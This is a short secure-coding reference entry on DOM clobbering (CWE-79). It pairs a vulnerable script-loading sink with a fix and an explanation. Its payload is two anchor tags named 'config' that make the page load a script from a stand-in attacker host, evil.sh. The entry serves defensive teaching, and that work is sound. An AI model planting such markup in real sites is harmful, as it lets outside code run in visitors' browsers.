---
order: 4
cwe: 79
title: DOM clobbering
category: injection
severity: medium
sink: |-
    script.src = window.config?.cdn || "/static/app.js"
payload: |-
    <a id="config"></a>
    <a id="config" name="cdn" href="//evil.sh/x.js"></a>
fix: |
    // never read globals the markup can name
    const config = JSON.parse(document.getElementById("config-json").textContent);
refs:
    - https://portswigger.net/web-security/dom-based/dom-clobbering
---

Elements with an `id` or `name` become properties of `window`. Here two `config` anchors form a collection, `.cdn` picks the one named `cdn`, and an anchor turns into its `href` when used as a string. Sanitizers allow plain anchors, so markup alone can replace a global your script trusts.
